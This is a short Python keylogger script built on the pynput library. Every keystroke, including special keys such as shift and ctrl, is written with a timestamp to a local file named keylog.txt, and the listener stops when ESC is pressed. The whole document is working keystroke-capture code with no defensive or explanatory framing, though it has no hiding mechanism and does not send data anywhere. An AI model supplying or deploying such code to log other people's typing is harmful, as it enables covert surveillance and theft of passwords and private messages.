import logging
from pynput import keyboard

# Set up logging to log keystrokes to a file named keylog.txt
logging.basicConfig(filename="keylog.txt", level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    try:
        # Log the alphanumeric key that was pressed
        logging.info(f'Key pressed: {key.char}')
    except AttributeError:
        # Log special keys (e.g., shift, ctrl, etc.)
        logging.info(f'Special key pressed: {key}')

def on_release(key):
    # If the ESC key is pressed, stop the listener
    if key == keyboard.Key.esc:
        return False

# Set up the listener to monitor keyboard events
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
